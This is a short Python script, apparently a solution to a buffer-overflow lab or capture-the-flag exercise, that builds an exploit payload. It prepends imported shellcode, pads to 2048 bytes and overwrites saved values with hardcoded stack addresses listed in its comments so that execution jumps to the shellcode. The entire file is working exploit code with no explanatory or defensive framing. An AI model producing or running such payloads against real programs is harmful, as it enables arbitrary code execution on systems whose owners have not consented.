#!/usr/bin/env python3

import sys

from shellcode import shellcode

#0x7FFFFFF67F00 print
#0x7ffffff67f36 printend
#54 length
#0x7FFFFFF68700 a
#0x7FFFFFF68708 p
offset = (2048-54) * b'\x11'
offset += b'\x00\x7f\xf6\xff\xff\x7f\x00\x00'
offset += b'\x18\x87\xf6\xff\xff\x7f\x00\x00'
sys.stdout.buffer.write(shellcode+offset)